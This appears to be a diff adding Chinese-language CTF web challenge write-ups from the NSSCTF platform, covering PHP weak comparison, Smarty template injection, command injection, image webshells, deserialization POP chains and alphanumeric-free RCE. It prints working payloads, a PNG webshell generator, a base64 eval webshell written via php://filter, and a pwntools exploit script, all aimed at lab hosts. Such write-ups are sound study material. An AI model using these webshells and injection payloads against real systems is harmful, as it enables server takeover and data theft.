@@ -1287,3 +1287,698 @@ COOKIE cookie=j0k3r
 ```
 
 get：123=flag&flag=123先传一个123=flag则变成->123=flag,然后传入：flag=123，变量覆盖之后就变成−>>123=flag,然后传入：flag=123，变量覆盖之后就变成−>>flag=$123(由于1=flag，所以会变成：123=flag，所以会变成：flag=$flag这样就不会把flag的值覆盖
+
+
+
+
+
+### [MoeCTF 2021]2048
+
+考点：js代码审计
+
+![image-20250122103618936](assets/image-20250122103618936.png)
+
+
+
+js里面看到这个
+
+```
+http://node5.anna.nssctf.cn:25541/flag.php?score=1000000000
+```
+
+分数大于50000即可拿到flag，随便传一个较大的数即可
+
+![image-20250122103835745](assets/image-20250122103835745.png)
+
+
+
+
+
+### [SWPUCTF 2022 新生赛]funny_php
+
+考点：弱比较 md5绕过 PHP
+
+```php
+<?php
+    session_start();
+    highlight_file(__FILE__);
+    if(isset($_GET['num'])){
+        if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
+            echo ":D";
+            $_SESSION['L1'] = 1;
+        }else{
+            echo ":C";
+        }
+    }
+    if(isset($_GET['str'])){
+        $str = preg_replace('/NSSCTF/',"",$_GET['str']);
+        if($str === "NSSCTF"){
+            echo "wow";
+            $_SESSION['L2'] = 1;
+        }else{
+            echo $str;
+        }
+    }
+    if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
+        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
+            echo "Nice!";
+            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
+                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
+                    echo "yoxi!";
+                    $_SESSION['L3'] = 1;
+                }else{
+                    echo "X(";
+                }
+            }
+        }else{
+            echo "G";
+            echo $_POST['md5_1']."\n".$_POST['md5_2'];
+        }
+    }
+    if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
+        include('flag.php');
+        echo $flag;
+    }
+
+    
+?>
+```
+
+payload:
+
+```
+GET ?num=9e9&str=NSSNSSCTFCTF
+POST md5_1=QNKCDZO&md5_2=240610708
+```
+
+第一个判断可以通过科学计数法实现
+
+第三个判断通过0e开头的md5进行绕过
+
+
+
+### [HDCTF 2023]SearchMaster
+
+![image-20250122111731969](assets/image-20250122111731969.png)
+
+拿到题目有提示 BUT YOU CAN POST ME A DATA
+
+dirsearch扫一下目录
+
+![image-20250122111823525](assets/image-20250122111823525.png)
+
+存在composer.json泄露
+
+![image-20250122111853065](assets/image-20250122111853065.png)
+
+说明网站使用了smarty库，猜测存在smarty模板注入
+
+结合前面的hint，data传参测一测
+
+![image-20250122113137034](assets/image-20250122113137034.png)
+
+payload:
+
+```
+string:{system('cat /f*')}
+```
+
+![image-20250122113509777](assets/image-20250122113509777.png)
+
+### [NSSRound#7 Team]ec_RCE
+
+```php
+<!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW -->
+<!-- By 探姬 -->
+<?PHP
+    
+    if(!isset($_POST["action"]) && !isset($_POST["data"]))
+        show_source(__FILE__);
+
+    putenv('LANG=zh_TW.utf8'); 
+
+    $action = $_POST["action"];
+    $data = "'".$_POST["data"]."'";
+
+    $output = shell_exec("/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar $action $data");
+    echo $output;    
+?>
+```
+
+直接构造闭合就出了
+
+```
+POST action=;cat /f*;&data=123
+```
+
+
+
+### [SWPUCTF 2023 秋季新生赛]ez_talk
+
+文件上传
+
+![image-20250122165435005](assets/image-20250122165435005.png)
+
+可以通过图片马绕过
+
+在图片中插入一句话木马，上传时将后缀改为php
+
+![image-20250122165541486](assets/image-20250122165541486.png)
+
+png图片马脚本
+
+```php
+<?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y < sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+
+imagepng($img,'./1.png');
+?>
+
+//木马为<?=$_GET[0]($_POST[1]);?>
+```
+
+payload:
+
+```
+POST 1=cat /flag
+GET 0=system
+```
+
+
+
+### [UUCTF 2022 新生赛]ezpop
+
+考点：反序列化 字符串逃逸 PHP
+
+```php
+<?php
+//flag in flag.php
+error_reporting(0);
+class UUCTF{
+    public $name,$key,$basedata,$ob;
+    function __construct($str){
+        $this->name=$str;
+    }
+    function __wakeup(){
+    if($this->key==="UUCTF"){
+            $this->ob=unserialize(base64_decode($this->basedata));
+        }
+        else{
+            die("oh!you should learn PHP unserialize String escape!");
+        }
+    }
+}
+class output{
+    public $a;
+    function __toString(){
+        $this->a->rce();
+    }
+}
+class nothing{
+    public $a;
+    public $b;
+    public $t;
+    function __wakeup(){
+        $this->a="";
+    }
+    function __destruct(){
+        $this->b=$this->t;
+        die($this->a);
+    }
+}
+class youwant{
+    public $cmd;
+    function rce(){
+        eval($this->cmd);
+    }
+}
+$pdata=$_POST["data"];
+if(isset($pdata))
+{
+    $data=serialize(new UUCTF($pdata));
+    $data_replace=str_replace("hacker","loveuu!",$data);
+    unserialize($data_replace);
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+拿到题目我们先不管前置，可以把pop链先找出来
+
+```
+youwant::rce() -> output::toString() -> nothing::destruct()
+```
+
+
+
+```
+<?php
+//flag in flag.php
+
+class output{
+    public $a;
+
+}
+class nothing{
+    public $a;
+    public $b;
+    public $t;
+}
+class youwant{
+    public $cmd;
+
+}
+
+$exp = new nothing();
+$exp->a = new output();
+$exp->a->t = new youwant();        
+$exp->a->a = &$exp->a->b;
+$exp->a->a->cmd = 'system("cat flag.php");';
+
+echo base64_encode(serialize($c));
+```
+
+我们接下来要考虑的是怎么把exp赋给basedata，同时也要让key=UUCTF
+
+```
+class UUCTF{
+    public $name,$key,$basedata,$ob;
+    function __construct($str){
+        $this->name=$str;
+    }
+    function __wakeup(){
+    if($this->key==="UUCTF"){
+            $this->ob=unserialize(base64_decode($this->basedata));
+        }
+        else{
+            die("oh!you should learn PHP unserialize String escape!");
+        }
+    }
+}
+```
+
+这就用到了一个考点，php反序列化字符串逃逸
+
+参考：[PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/107135706)
+
+> ![image-20250122204340754](assets/image-20250122204340754.png)
+>
+> [[UUCTF 2022 新生赛\]ezpop 详细题解(字符串逃逸)-CSDN博客](https://blog.csdn.net/weixin_73904941/article/details/143440458)
+
+根据字符串逃逸构造出最终exp
+
+exp
+
+```php
+<?php
+class UUCTF{
+    public $name,$key,$basedata,$ob;
+}
+class output{
+    public $a;  
+}
+class nothing{
+    public $a;  
+    public $b;
+    public $t;
+}
+class youwant{
+    public $cmd; 
+    }
+ 
+$a = new youwant();
+$a->cmd = 'system("cat flag.php");';
+$b = new output();
+$b->a = $a;
+$c = new nothing();
+$c->a = &$c->b;
+$c->t = $b;
+$basedata = base64_encode(serialize($c));
+ 
+$post='";s:3:"key";s:5:"UUCTF";s:2:"ob";N;s:8:"basedata";s:'.strlen($basedata).':"'.$basedata.'";}';
+for($i=0;$i<strlen($post);$i++)
+{
+  $hacker=$hacker.'hacker';
+ 
+}
+echo $hacker.$post;
+```
+
+> **为什么这里没办法绕过__wakeup()方法？**
+>
+> 题目的版本是PHP/7.2.34  
+>
+> __wakeup()绕过漏洞存在的版本需要满足 PHP5 < 5.6.25   PHP7 < 7.0.10
+
+
+
+### [羊城杯 2020]easyser
+
+考点：php反序列化 ssrf fuzz
+
+拿到题先扫一下目录
+
+![image-20250122205020866](assets/image-20250122205020866.png)
+
+robots.txt有hint
+
+![image-20250122205129100](assets/image-20250122205129100.png)
+
+访问/start1.php/
+
+![image-20250122205150014](assets/image-20250122205150014.png)
+
+![image-20250122205330478](assets/image-20250122205330478.png)
+
+源码有hint，应该是要读源码
+
+payload：
+
+```
+http://node4.anna.nssctf.cn:28113/star1.php?path=http://127.0.0.1/ser.php
+```
+
+```php
+<?php
+error_reporting(0);
+if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
+    highlight_file(__FILE__);
+} 
+$flag='{Trump_:"fake_news!"}';
+
+class GWHT{
+    public $hero;
+    public function __construct(){
+        $this->hero = new Yasuo;
+    }
+    public function __toString(){
+        if (isset($this->hero)){
+            return $this->hero->hasaki();
+        }else{
+            return "You don't look very happy";
+        }
+    }
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+    public function __construct($file='',$text='') {
+        $this -> file = $file;
+        $this -> text = $text;
+        
+    }
+    public function hasaki(){
+        $d   = '<?php die("nononon");?>';
+        $a= $d. $this->text;
+         @file_put_contents($this-> file,$a);
+    }
+}
+class Yasuo{
+    public function hasaki(){
+        return "I'm the best happy windy man";
+    }
+}
+
+?>
+```
+
+这个链子比较简单，但是很莫名其妙的触发了GWHT类的__toString()方法，我也不知道为什么
+
+死亡杂糅：https://xz.aliyun.com/t/8163
+
+poc
+
+```php
+<?php
+
+class GWHT{
+    public $hero;
+
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+
+}
+
+
+
+$door = new GWHT();
+$door->hero = new Yongen();
+$door->hero->file = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
+$door->hero->text = 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==';
+echo urlencode(serialize($door));
+
+
+
+?>
+```
+
+不是哥们，我传什么参呢
+
+抽象了，据说用arjun能爆破出来，但是我没成功就是了
+
+
+![image-20250122213430540](assets/image-20250122213430540.png)
+
+蚁剑连一下
+
+![image-20250122220318551](assets/image-20250122220318551.png)
+
+### [NISACTF 2022]midlevel
+
+![image-20250122220754000](assets/image-20250122220754000.png)
+
+拿到题目，是Smarty
+
+![image-20250122221443218](assets/image-20250122221443218.png)
+
+存在ssti
+
+https://xz.aliyun.com/t/11108
+
+payload:
+
+```
+X-Forwarded-For: string:{function name='x(){};system("cat /flag");function '}{/function}
+```
+
+![image-20250122221838374](assets/image-20250122221838374.png)
+
+### [GDOUCTF 2023]泄露的伪装
+
+考点：PHP伪协议目录扫描PHP
+
+![image-20250122222328018](assets/image-20250122222328018.png)
+
+/test.txt
+
+```php
+
+<?php
+error_reporting(0);
+if(isset($_GET['cxk'])){
+    $cxk=$_GET['cxk'];
+    if(file_get_contents($cxk)=="ctrl"){
+        echo $flag;
+    }else{
+        echo "洗洗睡吧";
+    }
+}else{
+    echo "nononoononoonono";
+}
+?>
+```
+
+/www.rar
+
+![image-20250122222435356](assets/image-20250122222435356.png)
+
+访问/orzorz.php
+
+![image-20250122222553028](assets/image-20250122222553028.png)
+
+这段 **PHP** 代码的作用是：接收一个名为 “**cxk**” 的 **GET** 参数，读取该参数指定的文件内容并与字符串 “**ctrl**” 进行比较。如果相等，则输出 $flag 的值；否则输出 “洗洗睡吧”。如果没有传递 **“cxk”** 参数，则输出 “nononoononoonono”。
+
+直接传入ctrl不行，我们可以尝试通过伪协议传入试试
+
+```
+data://text/plain;base64,Y3RybA==
+```
+
+
+
+### [GKCTF 2021]easycms
+
+考点 目录穿越 弱口令 RCE
+
+![image-20250122223226789](assets/image-20250122223226789.png)
+
+
+
+http://node4.anna.nssctf.cn:28371/admin.php
+
+![image-20250122223832953](assets/image-20250122223832953.png)
+
+抓个包想爆破，发现密码被加密了
+
+![image-20250122224144789](assets/image-20250122224144789.png)
+
+看一下js
+
+![image-20250122224308076](assets/image-20250122224308076.png)
+
+我去，有点麻烦
+
+先测一下弱口令吧 admin/12345 直接登进去了
+
+![image-20250122224753830](assets/image-20250122224753830.png)
+
+#### 解法一
+
+参考 https://blog.csdn.net/LYJ20010728/article/details/120005727
+
+这是一个cve
+
+![image-20250122230626306](assets/image-20250122230626306.png)
+
+可以在头部代码中插入恶意的代码
+
+如果保存文件时显示需要存在指定文件时才能进行模板修改
+
+![image-20250122230754536](assets/image-20250122230754536.png)
+
+可以通过设置中的微信设置中通过目录穿越创建对应文件即可
+
+![image-20250122230859401](assets/image-20250122230859401.png)
+
+保存后访问首页即可
+
+![image-20250122230935709](assets/image-20250122230935709.png)
+
+这题还有另一种解法
+
+#### 解法二
+
+在主题->自定义中
+
+![image-20250122231233586](assets/image-20250122231233586.png)
+
+可以导出主题
+
+![image-20250122231346108](assets/image-20250122231346108.png)
+
+导出主题
+
+复制下载链接
+
+```
+http://node4.anna.nssctf.cn:28371/admin.php?m=ui&f=downloadtheme&theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA==
+```
+
+将theme=后面base64解码后
+
+![image-20250122231516071](assets/image-20250122231516071.png)
+
+也就是说这里可能存在目录穿越
+
+![image-20250122231619595](assets/image-20250122231619595.png)
+
+尝试直接读flag
+
+![image-20250122231738958](assets/image-20250122231738958.png)
+
+![image-20250122231741798](assets/image-20250122231741798.png)
+
+
+
+### [鹏城杯 2022]简单的php
+
+```php
+<?php
+show_source(__FILE__);
+    $code = $_GET['code'];
+    if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
+        die(' Hello');
+    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
+        @eval($code);
+
+    }
+
+?>
+```
+
+无字母数字无参rce
+
+无参我们可以想到
+
+[无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/133808536)
+
+```
+var_dump(end(getallheaders()));
+```
+
+![image-20250122234110161](assets/image-20250122234110161.png)
+
+无字母数字我们可以想到取反
+
+两者结合一下，用一下大佬的脚本
+
+```php
+from pwn import *
+import html
+context.log_level = "debug"
+
+host = "node4.anna.nssctf.cn:28674"
+command = "system(end(getallheaders()))"
+cmd = "ls /;cat /nssctfflag;"
+
+
+##异或取反脚本
+codes = command.replace(")","").split("(")[:-1][::-1]
+res = ""
+inline = ""
+for code in codes:
+    re_code = "~"+"".join(["%"+hex(255 - ord(i))[2:]for i in code])
+    res = f"[{re_code}][!%ff]({inline})"
+    inline = res
+    print(res)
+res += ";"
+
+
+##发送数据
+raw = f'''GET /?code={res} HTTP/1.1
+Host: {host}
+Connection: close
+Content-Length: 0
+cmd: {cmd}
+
+
+'''.replace("\n","\r\n").encode()
+io = remote(host.split(":")[0],host.split(":")[1],ssl=False)
+io.send(raw)
+res = io.recvall().decode()
+html = html.unescape(res)
+print(html)
+```
+
